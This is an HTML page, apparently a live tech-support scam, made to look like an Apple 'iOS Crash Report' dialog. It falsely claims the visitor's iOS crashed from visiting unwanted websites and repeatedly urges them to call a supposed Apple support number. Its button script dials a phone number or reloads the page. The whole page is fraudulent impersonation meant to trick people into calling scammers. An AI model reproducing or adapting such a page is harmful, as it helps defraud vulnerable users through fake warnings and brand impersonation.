<!DOCTYPE html>
<html lang="en">
<head>
   
    <script defer data-domain="ios-u13p.onrender.com" src="https://plausible.io/js/script.js"></script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>iOS Crash Report</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #f2f2f7;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    }
    .dialog {
      background: #fff;
      padding: 30px 25px;
      border-radius: 20px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.25);
      text-align: center;
      width: 90%;
      max-width: 400px;
    }
    .dialog p {
      margin: 18px 0;
      font-size: 16px;
      color: #1c1c1e;
      line-height: 1.5;
    }
    .dialog b {
      font-weight: bold;
    }
    .button {
      margin-top: 25px;
      padding: 14px 25px;
      font-size: 18px;
      background-color: #007aff;
      color: white;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      width: 100%;
    }
    .button:hover {
      background-color: #005ecb;
    }
  </style>
</head>
<body>

<div class="dialog">
  <p><b>**** iOS Crash Report ****</b></p>
  <p><b>iOS</b> crashed previously due to unwanted websites visit.</p>
  <p>There is a problem with the configuration of your <b>iOS</b>.</p>
  <p>Please call <b>Apple Technical Support</b> <br> <b>1-877-419-2386</b>.</p>
  <p>Click on OK, this will attempt to send a crash report to Apple.</p>
  <p>Call now: <b>1-877-419-2386</b></p>
  <button class="button" onclick="handleClick()">OK</button>
</div>

<script>
function handleClick() {
  const confirmCall = confirm("Do you want to call Apple Technical Support?");
  if (confirmCall) {
    window.location.href = "tel:18888888888";
  } else {
    location.reload();
  }
}
</script>

</body>
</html>
